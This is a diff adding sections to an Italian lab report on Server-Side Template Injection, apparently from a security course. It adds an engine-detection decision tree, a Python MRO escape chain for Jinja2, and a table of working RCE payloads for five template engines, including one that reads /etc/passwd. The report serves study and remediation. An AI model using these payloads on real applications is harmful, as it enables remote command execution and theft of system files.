@@ -1,3 +1,5 @@
+> [English](README.en.md) | **Italiano**
+
 # Vulnerability Assessment: Server-Side Template Injection (SSTI)
 
 > - **Fase:** Web Attack - Server Side Template Injection
@@ -122,6 +124,84 @@ Come mostrato nello screenshot, l'input malevolo viene riflesso fedelmente senza
 ## 6 Conclusioni
 
 La vulnerabilità SSTI è stata correttamente mitigata tramite l'adozione di pratiche di Secure Coding. Si raccomanda di mantenere l'approccio di separazione tra logica e dati per tutti i futuri sviluppi che coinvolgano motori di template.
+
+---
+
+## Analisi a Basso Livello: SSTI Detection Tree e Python MRO
+
+### Decision Tree per Identificare il Template Engine
+
+Non tutti i template engine rispondono allo stesso payload. L'identificazione del motore segue un albero decisionale:
+
+```
+Input: ${7*7}
+    |
+    +-- Output: 49 -> Possibile Freemarker, Velocity, Mako
+    +-- Output: ${7*7} -> Non Freemarker
+         |
+         Input: {{7*7}}
+             |
+             +-- Output: 49 -> Jinja2, Twig, Nunjucks
+             |    |
+             |    Input: {{7*'7'}}
+             |        +-- Output: 7777777 -> Jinja2 (Python string multiplication)
+             |        +-- Output: 49 -> Twig (PHP)
+             |        +-- Errore -> Nunjucks (JS)
+             |
+             +-- Output: {{7*7}} -> Non template o auto-escaped
+                  |
+                  Input: #{7*7}
+                      +-- Output: 49 -> Thymeleaf (Java)
+                      +-- Output: #{7*7} -> ERB, Slim, altro
+```
+
+### Method Resolution Order (MRO) - La Catena di Escape
+
+L'exploit SSTI in Jinja2 sfrutta l'MRO di Python per risalire dalla sandbox del template all'interprete Python completo:
+
+```python
+# La catena di escape dal template alla shell:
+
+# Step 1: Partire da un oggetto qualsiasi nel contesto del template
+''               # stringa vuota (sempre disponibile)
+
+# Step 2: Risalire la gerarchia delle classi Python
+''.__class__     # -> <class 'str'>
+''.__class__.__mro__  # -> (<class 'str'>, <class 'object'>)
+
+# Step 3: Da 'object', accedere a TUTTE le sottoclassi caricate in memoria
+''.__class__.__mro__[1].__subclasses__()
+# -> [<class 'type'>, <class 'weakref'>, ..., <class 'subprocess.Popen'>, ...]
+
+# Step 4: Trovare una classe utile (os._wrap_close, subprocess.Popen, etc.)
+# Indice varia per versione Python - spesso 132, 396, o ricerca con loop
+
+# Step 5: Esecuzione comando
+''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read()
+
+# Payload compatto (alternativo a MRO):
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+### SSTI in Altri Template Engine
+
+| Engine | Linguaggio | Payload Detection | Payload RCE |
+| :--- | :--- | :--- | :--- |
+| Jinja2 | Python | `{{7*7}}` -> 49 | `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}` |
+| Twig | PHP | `{{7*7}}` -> 49 | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
+| Freemarker | Java | `${7*7}` -> 49 | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
+| ERB | Ruby | `<%= 7*7 %>` -> 49 | `<%= system("id") %>` |
+| Pug | Node.js | `#{7*7}` -> 49 | `#{root.process.mainModule.require('child_process').execSync('id')}` |
+
+---
+
+## Esperienza di Laboratorio
+
+Il test iniziale con `{{ 7*7 }}` ha prodotto `49`, confermando immediatamente la presenza di SSTI. La semplicita del payload di detection contrasta con la complessita dell'exploit RCE: passare da "49" a "esecuzione di comandi" richiede la comprensione dell'MRO di Python e della gerarchia delle classi, concetti non banali per chi non conosce gli internals del linguaggio.
+
+Il payload `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read() }}` e stato scelto perche funziona su tutte le versioni di Jinja2/Python senza dipendere da un indice specifico nella lista `__subclasses__()`. I payload basati su indice numerico (es. `__subclasses__()[132]`) sono fragili perche l'indice cambia con la versione di Python e i moduli importati.
+
+La verifica post-remediation ha dimostrato che il fix (passare la variabile come contesto invece di concatenarla nel template) e definitivo: Jinja2 applica automaticamente l'escaping HTML sulle variabili di contesto, convertendo `{{` in `&#123;&#123;` prima del rendering. Questo impedisce strutturalmente l'interpretazione dei tag template, indipendentemente dal payload usato.
 
 ---
 
